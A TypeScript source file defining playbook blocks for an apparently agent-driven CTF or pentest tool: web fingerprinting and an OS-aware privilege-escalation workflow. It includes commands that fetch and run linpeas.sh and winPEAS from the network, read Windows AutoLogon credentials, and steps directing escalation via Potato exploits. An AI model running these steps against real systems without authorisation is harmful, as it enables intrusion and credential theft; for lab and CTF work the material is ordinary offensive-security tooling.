/**
 * Built-in reusable blocks. Web Recon only for now.
 * Others will be added once the CTF flow is proven.
 */
import type { PlaybookStep } from "./schema.js";

export interface BlockDef {
  name: string;
  description: string;
  inputSchema: Record<string, string>;
  outputSchema: Record<string, string>;
  nodes: PlaybookStep[];
}

function withStartEnd(block: BlockDef): BlockDef {
  const prefix = block.nodes[0]?.key.split(".")[0] ?? "block";
  const startKey = `${prefix}.start`;
  const endKey = `${prefix}.end`;
  const rootNodes = block.nodes.filter((n) => !n.dependsOn?.length);
  const leafNodes = block.nodes.filter((n) => !block.nodes.some((other) => other.dependsOn?.includes(n.key)));

  const startNode: PlaybookStep = { key: startKey, title: `Start: ${block.name}`, type: "mechanical", nodeType: "sequence", priority: 0 };
  const endNode: PlaybookStep = { key: endKey, title: `Done: ${block.name}`, type: "mechanical", nodeType: "sequence", dependsOn: leafNodes.map((n) => n.key), priority: 99 };

  const updatedNodes = block.nodes.map((n) => {
    if (rootNodes.includes(n) && !n.dependsOn?.length) {
      return { ...n, dependsOn: [startKey] };
    }
    return n;
  });

  return { ...block, nodes: [startNode, ...updatedNodes, endNode] };
}

export const WEB_RECON_BLOCK: BlockDef = {
  name: "Web Recon",
  description: "Web service fingerprinting: tech stack, WAF, headers, favicon hash.",
  inputSchema: { host: "string", port: "number" },
  outputSchema: { tech: "string[]", waf: "string" },
  nodes: [
    { key: "web_recon.tech", title: "Web stack fingerprint (whatweb)", type: "mechanical", command: "pk exec -- whatweb http://{host}:{port} --color=never", priority: 10 },
    { key: "web_recon.waf", title: "WAF detection (wafw00f)", type: "mechanical", command: "pk exec -- wafw00f http://{host}:{port}", priority: 12 },
    { key: "web_recon.headers", title: "HTTP header inspection", type: "mechanical", command: "pk exec -- curl -sI http://{host}:{port}", priority: 11 },
    { key: "web_recon.favicon", title: "Favicon hash lookup", type: "mechanical", command: "pk exec -- curl -s http://{host}:{port}/favicon.ico | md5sum", priority: 13 },
  ],
};

export const PRIVESC_BLOCK: BlockDef = {
  name: "Privilege Escalation",
  description: "OS-aware privesc. Detects Linux/Windows/macOS and runs the appropriate checks.",
  inputSchema: { host: "string" },
  outputSchema: { vector: "string", root: "boolean" },
  nodes: [
    // OS detection
    { key: "privesc.detect_os", title: "Detect OS", type: "mechanical", command: "pk exec -- uname -s 2>/dev/null || ver 2>/dev/null || echo unknown", priority: 5 },

    // Selector: pick OS-specific branch
    { key: "privesc.os_switch", title: "OS Switch", type: "mechanical", nodeType: "selector", dependsOn: ["privesc.detect_os"], priority: 8 },

    // --- Linux branch ---
    { key: "privesc.linux_auto", title: "Linux: linpeas.sh", type: "mechanical", command: "pk exec -- curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null || echo 'linpeas unavailable, using manual checks'", dependsOn: ["privesc.os_switch"], condition: "ports.service contains ssh", priority: 9, description: "Automated privesc enumeration. Catches capabilities, docker group, interesting files, and dozens of vectors." },
    { key: "privesc.linux_sudo", title: "Linux: sudo -l", type: "mechanical", command: "pk exec -- sudo -l 2>/dev/null", dependsOn: ["privesc.os_switch"], condition: "ports.service contains ssh", priority: 10 },
    { key: "privesc.linux_suid", title: "Linux: SUID binaries", type: "mechanical", command: "pk exec -- find / -perm -4000 -type f 2>/dev/null", dependsOn: ["privesc.os_switch"], condition: "ports.service contains ssh", priority: 10 },
    { key: "privesc.linux_cron", title: "Linux: Cron jobs", type: "mechanical", command: "pk exec -- cat /etc/crontab 2>/dev/null && ls -la /etc/cron.* 2>/dev/null && crontab -l 2>/dev/null", dependsOn: ["privesc.os_switch"], condition: "ports.service contains ssh", priority: 15 },
    { key: "privesc.linux_writable", title: "Linux: Writable paths", type: "mechanical", command: "pk exec -- find / -writable -type f 2>/dev/null | grep -v proc | head -20", dependsOn: ["privesc.os_switch"], condition: "ports.service contains ssh", priority: 20 },
    { key: "privesc.linux_kernel", title: "Linux: Kernel version check", type: "judgment", description: "Check kernel version against known exploits. Prefer GTFOBins for SUID/sudo over kernel exploits.", dependsOn: ["privesc.linux_auto", "privesc.linux_sudo", "privesc.linux_suid"], priority: 25 },

    // --- Windows branch ---
    { key: "privesc.win_auto", title: "Windows: winPEAS", type: "mechanical", command: "pk exec -- curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o /tmp/winpeas.exe && /tmp/winpeas.exe 2>/dev/null || echo 'winpeas unavailable'", dependsOn: ["privesc.os_switch"], condition: "ports.port in [135,139,445,3389]", priority: 9 },
    { key: "privesc.win_whoami", title: "Windows: whoami /priv", type: "mechanical", command: "pk exec -- whoami /priv", dependsOn: ["privesc.os_switch"], condition: "ports.port in [135,139,445,3389]", priority: 10 },
    { key: "privesc.win_services", title: "Windows: Weak service perms", type: "mechanical", command: "pk exec -- sc query state= all | findstr SERVICE_NAME", dependsOn: ["privesc.os_switch"], condition: "ports.port in [135,139,445,3389]", priority: 15 },
    { key: "privesc.win_unquoted", title: "Windows: Unquoted service paths", type: "mechanical", command: "pk exec -- wmic service get name,pathname | findstr /v /c:\"C:\\Windows\"", dependsOn: ["privesc.os_switch"], condition: "ports.port in [135,139,445,3389]", priority: 15 },
    { key: "privesc.win_autologon", title: "Windows: AutoLogon creds", type: "mechanical", command: "pk exec -- reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>/dev/null", dependsOn: ["privesc.os_switch"], condition: "ports.port in [135,139,445,3389]", priority: 20 },
    { key: "privesc.win_potato", title: "Windows: Potato exploits", type: "judgment", description: "Check for SeImpersonate/SeAssignPrimaryToken. If present, use PrintSpoofer/GodPotato/JuicyPotato.", dependsOn: ["privesc.win_whoami"], priority: 25 },

    // --- macOS branch ---
    { key: "privesc.mac_sudo", title: "macOS: sudo -l", type: "mechanical", command: "pk exec -- sudo -l 2>/dev/null", dependsOn: ["privesc.os_switch"], priority: 10 },
    { key: "privesc.mac_tcc", title: "macOS: TCC database", type: "judgment", description: "Check TCC.db for full disk access, screen recording, accessibility permissions that could be abused.", dependsOn: ["privesc.os_switch"], priority: 15 },
    { key: "privesc.mac_launchd", title: "macOS: LaunchDaemons/Agents", type: "mechanical", command: "pk exec -- ls -la /Library/LaunchDaemons/ /Library/LaunchAgents/ ~/Library/LaunchAgents/ 2>/dev/null", dependsOn: ["privesc.os_switch"], priority: 15 },

    // Converge: pick the best vector from whichever OS branch ran
    { key: "privesc.choose", title: "Choose privesc vector", type: "judgment", description: "Evaluate all findings from automated + manual checks. Pick the most reliable, least destructive escalation path. Use GTFOBins for SUID/sudo.", dependsOn: ["privesc.linux_kernel", "privesc.linux_cron", "privesc.linux_writable", "privesc.win_auto", "privesc.win_potato", "privesc.win_services", "privesc.win_unquoted", "privesc.win_autologon", "privesc.mac_sudo", "privesc.mac_tcc", "privesc.mac_launchd"], priority: 30 },
    { key: "privesc.escalate", title: "Execute escalation", type: "judgment", description: "Run the chosen privesc exploit. Capture evidence of elevated access.", dependsOn: ["privesc.choose"], priority: 35 },
  ],
};

export const BUILTIN_BLOCKS: BlockDef[] = [
  WEB_RECON_BLOCK,
  PRIVESC_BLOCK,
].map(withStartEnd);
